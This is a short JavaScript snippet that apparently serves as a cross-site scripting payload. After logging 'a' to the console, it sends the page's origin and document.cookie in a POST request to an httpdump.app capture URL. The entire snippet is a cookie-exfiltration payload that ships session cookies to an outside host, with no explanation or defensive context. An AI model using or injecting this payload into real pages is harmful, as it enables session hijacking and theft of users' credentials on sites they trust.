console.log("a");
fetch('https://httpdump.app/dumps/27aa5ed1-1986-4fcb-ae3f-345b65860989', {
    method: 'POST',
    body: JSON.stringify({
        message: window.origin + " stuff "+document.cookie,
    }),
    headers: {
        'Content-Type': 'application/json',
    },
})
